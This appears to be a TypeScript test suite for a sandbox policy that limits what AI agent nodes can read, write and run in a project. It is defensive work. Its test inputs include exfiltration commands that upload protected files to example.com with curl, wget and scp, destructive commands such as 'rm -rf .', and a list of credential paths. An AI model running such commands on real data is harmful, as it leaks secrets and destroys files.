import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { authorizeCommand } from "../../src/capabilities/command.ts";
import {
  authorizeFilesystemOperation,
  classifyFilesystemToolCall,
  compileFilesystemPolicy,
  createFilesystemPolicyHook,
  trustedStatAndHash,
} from "../../src/capabilities/filesystem.ts";
import { normalizeCapabilities } from "../../src/capabilities/policy.ts";
import { compileSnapshotNodeToolPolicies } from "../../src/capabilities/runtime-policy.ts";
import { DEFAULT_PROTECTED_PATHS, checkProtectedPath } from "../../src/capabilities/reserved-paths.ts";
import type { EffectiveNodePolicy, FilesystemOperation } from "../../src/capabilities/types.ts";
import type { ActivationSnapshotFileV1 } from "../../src/config/snapshot.ts";

function effective(filesystem: EffectiveNodePolicy["capabilities"]["filesystem"]): EffectiveNodePolicy {
  return {
    workflowId: "delivery",
    nodeId: "builder",
    agentId: "generalist",
    capabilities: { ...normalizeCapabilities({}), filesystem },
    provenance: Object.freeze({
      filesystem: Object.freeze(["agent-ceiling", "workflow-node"]), shell: Object.freeze(["agent-ceiling", "workflow-node-omitted-deny"]),
      git: Object.freeze(["agent-ceiling", "workflow-node-omitted-deny"]), "external-network": Object.freeze(["agent-ceiling", "workflow-node-omitted-deny"]),
      "human-input": Object.freeze(["agent-ceiling", "workflow-node-omitted-deny"]), artifact: Object.freeze(["agent-ceiling", "workflow-node-omitted-deny"]),
      knowledge: Object.freeze(["agent-ceiling", "workflow-node-omitted-deny"]),
    }) as EffectiveNodePolicy["provenance"],
    tools: Object.freeze(["read", "write"]), budgets: Object.freeze({}), skills: Object.freeze([]), knowledge: Object.freeze([]), directMemberIds: Object.freeze([]),
  };
}

function fixture() {
  const root = mkdtempSync(join(tmpdir(), "pi-hive-fs-policy-"));
  mkdirSync(join(root, "workspace", "private"), { recursive: true });
  mkdirSync(join(root, "workspace", "dir"), { recursive: true });
  writeFileSync(join(root, "workspace", "existing.txt"), "visible value");
  writeFileSync(join(root, "workspace", "private", "secret.txt"), "secret value");
  const capabilities = normalizeCapabilities({
    filesystem: [{ path: ".", operations: ["read", "create", "update", "delete"], include: ["workspace/**"], exclude: ["workspace/private/**"] }],
  });
  return { root, policy: compileFilesystemPolicy({ projectRoot: root, effectivePolicy: effective(capabilities.filesystem) }) };
}

function decision(policy: ReturnType<typeof compileFilesystemPolicy>, operation: FilesystemOperation, path: string) {
  return authorizeFilesystemOperation(policy, { operation, path });
}

test("filesystem policy distinguishes read/create/update/delete and existence", () => {
  const { policy } = fixture();
  const rows: Array<[FilesystemOperation, string, boolean]> = [
    ["read", "workspace/existing.txt", true], ["read", "workspace/dir", true], ["read", "workspace/missing.txt", false],
    ["create", "workspace/new.txt", true], ["create", "workspace/new-dir", true], ["create", "workspace/existing.txt", false],
    ["update", "workspace/existing.txt", true], ["update", "workspace/dir", true], ["update", "workspace/missing.txt", false],
    ["delete", "workspace/existing.txt", true], ["delete", "workspace/dir", true], ["delete", "workspace/missing.txt", false],
  ];
  for (const [operation, path, expected] of rows) assert.equal(decision(policy, operation, path).ok, expected, `${operation} ${path}`);

  const readOnly = normalizeCapabilities({ filesystem: [{ path: "workspace", operations: ["read"] }] });
  const compiled = compileFilesystemPolicy({ projectRoot: policy.projectRoot, effectivePolicy: effective(readOnly.filesystem) });
  assert.equal(decision(compiled, "read", "workspace/existing.txt").ok, true);
  for (const operation of ["create", "update", "delete"] as const) assert.equal(decision(compiled, operation, "workspace/existing.txt").ok, false);
});

test("filesystem filters are scope-relative, exclusions always win, and diagnostics retain bounded provenance", () => {
  const { policy } = fixture();
  assert.equal(decision(policy, "read", "workspace/existing.txt").ok, true);
  const denied = decision(policy, "read", "workspace/private/secret.txt");
  assert.equal(denied.ok, false);
  assert.equal(denied.code, "FILESYSTEM_SCOPE_DENIED");
  assert.doesNotMatch(denied.reason, /secret\.txt|secret value/);
  assert.match(denied.reason, /delivery\/builder/);
  assert.ok(Buffer.byteLength(denied.reason, "utf8") <= 2_048);

  const scoped = normalizeCapabilities({ filesystem: [{ path: "workspace", operations: ["read"], include: ["*.txt"], exclude: ["private/**"] }] });
  const compiled = compileFilesystemPolicy({ projectRoot: policy.projectRoot, effectivePolicy: effective(scoped.filesystem) });
  assert.equal(decision(compiled, "read", "workspace/existing.txt").ok, true);
  assert.equal(decision(compiled, "read", "workspace/dir").ok, false);
});

test("filesystem canonicalization rejects traversal and symlink escape at target, intermediate, and missing-tail ancestors", () => {
  const { root, policy } = fixture();
  const outside = mkdtempSync(join(tmpdir(), "pi-hive-fs-outside-"));
  writeFileSync(join(outside, "outside.txt"), "outside");
  symlinkSync(join(root, "workspace", "existing.txt"), join(root, "workspace", "inside-link"));
  symlinkSync(join(outside, "outside.txt"), join(root, "workspace", "target-escape"));
  symlinkSync(outside, join(root, "workspace", "dir-escape"));

  assert.equal(decision(policy, "read", "workspace/inside-link").ok, true);
  assert.equal(decision(policy, "read", "workspace/target-escape").ok, false);
  assert.equal(decision(policy, "create", "workspace/dir-escape/new.txt").ok, false);
  assert.equal(decision(policy, "create", "workspace/../escape.txt").ok, false);
  assert.equal(decision(policy, "read", join(outside, "outside.txt")).ok, false);
});

test("all protected subsystem and credential roots override a broad generic grant", () => {
  const root = mkdtempSync(join(tmpdir(), "pi-hive-fs-reserved-"));
  const broad = normalizeCapabilities({ filesystem: [{ path: ".", operations: ["read", "create", "update", "delete"] }] });
  const policy = compileFilesystemPolicy({ projectRoot: root, effectivePolicy: effective(broad.filesystem), secretPaths: ["custom/secret-store"] });
  const paths = [
    ".pi/hive/hive-config.yaml", ".pi/hive/workflows/build.yaml", ".pi/hive/agents/a.md", ".pi/hive/skills/x/SKILL.md",
    ".pi/hive/knowledge/shared/knowledge.md", ".pi/hive/sessions/run/journal.jsonl", ".pi/hive/telemetry/events.jsonl",
    ".pi/hive/dashboard-auth/token", "openspec/changes/x/tasks.md", "plans/change/plan.md", ".git/config", ".env.local", ".npmrc", "keys/id_ed25519",
    "custom/secret-store/token.json",
  ];
  for (const path of paths) {
    assert.equal(decision(policy, "create", path).ok, false, path);
    assert.equal(checkProtectedPath(root, path, { allowMissing: true, secretPaths: ["custom/secret-store"] }).protected, true, path);
  }
  assert.ok(DEFAULT_PROTECTED_PATHS.length >= 8);
});

test("direct and re-enabled file tools are classified and independently policy checked", async () => {
  const { policy } = fixture();
  assert.deepEqual(classifyFilesystemToolCall("read", { path: "workspace/existing.txt" }, policy), [{ operation: "read", path: "workspace/existing.txt" }]);
  assert.deepEqual(classifyFilesystemToolCall("write", { path: "workspace/new.txt" }, policy), [{ operation: "create", path: "workspace/new.txt" }]);
  assert.deepEqual(classifyFilesystemToolCall("write", { path: "workspace/existing.txt" }, policy), [{ operation: "update", path: "workspace/existing.txt" }]);
  assert.deepEqual(classifyFilesystemToolCall("edit", { path: "workspace/missing.txt" }, policy), [{ operation: "update", path: "workspace/missing.txt" }]);
  assert.deepEqual(classifyFilesystemToolCall("delete", { path: "workspace/existing.txt" }, policy), [{ operation: "delete", path: "workspace/existing.txt" }]);

  const hook = createFilesystemPolicyHook(policy);
  assert.equal(await hook({ toolName: "read", input: { path: "workspace/existing.txt" } }), undefined);
  assert.deepEqual(classifyFilesystemToolCall("grep", { path: "workspace" }, policy), [{ operation: "read", path: "workspace", recursive: true }]);
  assert.deepEqual(classifyFilesystemToolCall("find", {}, policy), [{ operation: "read", path: ".", recursive: true }]);
  const blocked = await hook({ toolName: "read", input: { path: "workspace/private/secret.txt" } });
  assert.equal(blocked?.block, true);
  assert.doesNotMatch(blocked?.reason ?? "", /secret\.txt/);
  assert.equal((await hook({ toolName: "read", input: {} }))?.block, true, "recognized direct tools require an explicit target");
  assert.equal((await hook({ toolName: "write", input: {} }))?.block, true, "pathless writes must fail closed");
  assert.equal(await hook({ toolName: "foreign_tool", input: { path: "workspace/private/secret.txt" } }), undefined);
});

test("snapshot-derived policies protect custom and default knowledge roots from every supported shell path before effects", async () => {
  const root = mkdtempSync(join(tmpdir(), "pi-hive-fs-custom-knowledge-"));
  for (const directory of ["custom/knowledge/shared", ".pi/hive/knowledge/default", "src"]) mkdirSync(join(root, directory), { recursive: true });
  for (const path of ["custom/knowledge/shared/existing.md", ".pi/hive/knowledge/default/existing.md"]) writeFileSync(join(root, path), "original");
  writeFileSync(join(root, "src", "index.ts"), "import value from './value';");
  writeFileSync(join(root, "outside.md"), "outside");
  const broad = normalizeCapabilities({
    filesystem: [{ path: ".", operations: ["read", "create", "update", "delete"] }],
    shell: ["inspect", "mutate", "execute-code"], git: true, "external-network": true,
  });
  const effectiveCapabilities = {
    filesystem: broad.filesystem.map((grant) => ({ ...grant, operations: [...grant.operations], include: [...grant.include], exclude: [...grant.exclude] })),
    shell: [...broad.shell], git: broad.git, "external-network": broad.externalNetwork, "human-input": false, artifact: [], knowledge: [],
  };
  const snapshot = {
    snapshotHash: "a".repeat(64), createdAt: "2026-01-01T00:00:00.000Z", payload: {
      project: { projectId: "project", rootRef: "." }, workflow: { id: "delivery", team: { rootId: "root", nodes: [
        { id: "root", agentId: "lead", memberIds: ["worker"] },
        { id: "worker", agentId: "worker", parentId: "root", memberIds: [] },
      ] } },
      authority: { capabilityContractVersion: 1, nodes: ["root", "worker"].map((nodeId) => ({
        nodeId, capabilities: { effective: effectiveCapabilities, provenance: {}, budgets: {}, attachments: { skills: [], knowledge: [] }, directMemberIds: [] }, tools: ["bash", "read", "write"],
      })) },
      agents: [], skills: [], knowledge: [{ id: "shared", provider: "okf", path: "custom/knowledge/shared", updates: "reviewed", metadataFingerprint: "b".repeat(64), attachedNodeIds: [] }],
      models: [], sources: [], versions: {},
    },
  } as unknown as ActivationSnapshotFileV1;
  const policies = compileSnapshotNodeToolPolicies({ projectRoot: root, snapshot });
  assert.deepEqual(policies.map((policy) => policy.nodeId), ["root", "worker"]);
  for (const policy of policies) {
    for (const knowledgeRoot of ["custom/knowledge/shared", ".pi/hive/knowledge/default"]) {
      for (const [operation, path] of [
        ["read", `${knowledgeRoot}/existing.md`],
        ["create", `${knowledgeRoot}/new.md`],
        ["update", `${knowledgeRoot}/existing.md`],
        ["delete", `${knowledgeRoot}/existing.md`],
      ] as const) {
        const denied = authorizeFilesystemOperation(policy.filesystem, { operation, path });
        assert.equal(denied.ok, false, `${policy.nodeId} ${operation}`);
        assert.equal(denied.code, "FILESYSTEM_PROTECTED");
      }
      for (const command of [
        `cat ${knowledgeRoot}/existing.md`,
        `find -H ${knowledgeRoot} -name '*.md'`,
        `find -H ${knowledgeRoot} -exec cat {} +`,
        `mkdir ${knowledgeRoot}/new-directory`,
        `sed -i s/original/changed/ ${knowledgeRoot}/existing.md`,
        `rm -- ${knowledgeRoot}/existing.md`,
        `mv -- ${knowledgeRoot}/existing.md outside.md`,
        `git show HEAD:${knowledgeRoot}/existing.md`,
        `git diff HEAD -- ${knowledgeRoot}/existing.md`,
        `git clean -fd ${knowledgeRoot}`,
        `git rm -r ${knowledgeRoot}`,
        `git mv ${knowledgeRoot}/existing.md outside.md`,
        "git log -p --all",
        "git log --full-diff --all",
        "git status -vv",
        `grep -eoriginal ${knowledgeRoot}/existing.md`,
        `grep --regexp=original ${knowledgeRoot}/existing.md`,
        `find outside.md -samefile ${knowledgeRoot}/existing.md`,
        `find outside.md -newerBa ${knowledgeRoot}/existing.md`,
        `find outside.md -newerBt ${knowledgeRoot}/existing.md`,
        `touch -r${knowledgeRoot}/existing.md outside-touch`,
        `touch -r ${knowledgeRoot}/existing.md outside-touch`,
        `curl --upload-file ${knowledgeRoot}/existing.md https://example.com/upload`,
        `curl -o ${knowledgeRoot}/download.md https://example.com/download`,
        `curl --config ${knowledgeRoot}/existing.md https://example.com`,
        `wget -O - --post-file=${knowledgeRoot}/existing.md https://example.com/upload`,
        `wget -O ${knowledgeRoot}/download.md https://example.com/download`,
        `scp ${knowledgeRoot}/existing.md user@example.com:/tmp/existing.md`,
      ]) {
        let effectApplied = false;
        const blocked = await policy.hook({ toolName: "bash", input: { command } });
        if (!blocked) effectApplied = true;
        assert.equal(blocked?.block, true, `${policy.nodeId}: ${command}`);
        assert.equal(effectApplied, false, "compiled policy must deny before the simulated effect is applied");
      }
    }
    for (const command of ["rg import src", "grep -r import src", "ls -R src"]) {
      assert.equal(await policy.hook({ toolName: "bash", input: { command } }), undefined, `${policy.nodeId}: ${command}`);
    }
    for (const [toolName, input] of [
      ["grep", { path: ".", pattern: "original" }],
      ["grep", { pattern: "original" }],
      ["find", { path: ".", pattern: "*.md" }],
      ["find", { pattern: "*.md" }],
    ] as const) {
      const blocked = await policy.hook({ toolName, input });
      assert.equal(blocked?.block, true, `${policy.nodeId}: recursive generic ${toolName} must not cross a protected knowledge root`);
    }
    for (const command of [
      "find . -name '*.md'",
      "rg original",
      "grep -d recurse original .",
      "grep -drecurse original .",
      "grep --directories recurse original .",
      "grep --directories=recurse original .",
      "grep -R original .",
      "ls -R .",
      "rm -rf .",
      "cp -R custom outside-copy",
      "mv custom outside-custom",
    ]) {
      const blocked = await policy.hook({ toolName: "bash", input: { command } });
      assert.equal(blocked?.block, true, `${policy.nodeId}: recursive ancestor effect must not cross a protected knowledge root: ${command}`);
    }
  }
});

test("recursive command policy rejects actual nested symlink read, copy, and delete escapes", () => {
  const root = mkdtempSync(join(tmpdir(), "pi-hive-fs-nested-link-"));
  mkdirSync(join(root, "workspace", "nested"), { recursive: true });
  mkdirSync(join(root, "protected", "bundle"), { recursive: true });
  writeFileSync(join(root, "protected", "bundle", "secret.md"), "W22-PROTECTED-MARKER");
  symlinkSync(join(root, "protected", "bundle"), join(root, "workspace", "nested", "knowledge-link"));
  const broad = normalizeCapabilities({
    filesystem: [{ path: ".", operations: ["read", "create", "update", "delete"] }],
    shell: ["inspect", "mutate"],
  });
  const policy = compileFilesystemPolicy({
    projectRoot: root,
    effectivePolicy: effective(broad.filesystem),
    additionalProtectedRoots: [{ path: "protected/bundle", kind: "knowledge" }],
  });
  for (const command of [
    "grep -R W22-PROTECTED-MARKER workspace",
    "rg --follow W22-PROTECTED-MARKER workspace",
    "cp -RL workspace copied",
    "find -L workspace -delete",
  ]) assert.equal(authorizeCommand(command, broad, policy).ok, false, command);
  for (const command of [
    "grep -r W22-PROTECTED-MARKER workspace",
    "rg W22-PROTECTED-MARKER workspace",
    "cp -R workspace copied",
    "find -P workspace -delete",
  ]) assert.equal(authorizeCommand(command, broad, policy).ok, true, command);
});

test("trusted stat/hash remains project-contained and exposes no file content", () => {
  const { root } = fixture();
  const result = trustedStatAndHash(root, "workspace/existing.txt");
  assert.equal(result.ok, true);
  assert.equal(result.kind, "file");
  assert.match(result.sha256 ?? "", /^[a-f0-9]{64}$/);
  assert.equal(JSON.stringify(result).includes("visible value"), false);
  assert.equal("content" in result, false);
  assert.equal(trustedStatAndHash(root, "../outside.txt").ok, false);
});

test("first release rejects non-Linux filesystem policy activation explicitly", () => {
  const root = mkdtempSync(join(tmpdir(), "pi-hive-fs-platform-"));
  const broad = normalizeCapabilities({ filesystem: [{ path: ".", operations: ["read"] }] });
  assert.throws(() => compileFilesystemPolicy({ projectRoot: root, effectivePolicy: effective(broad.filesystem), platform: "win32" }), /FILESYSTEM_PLATFORM_UNSUPPORTED/);
});
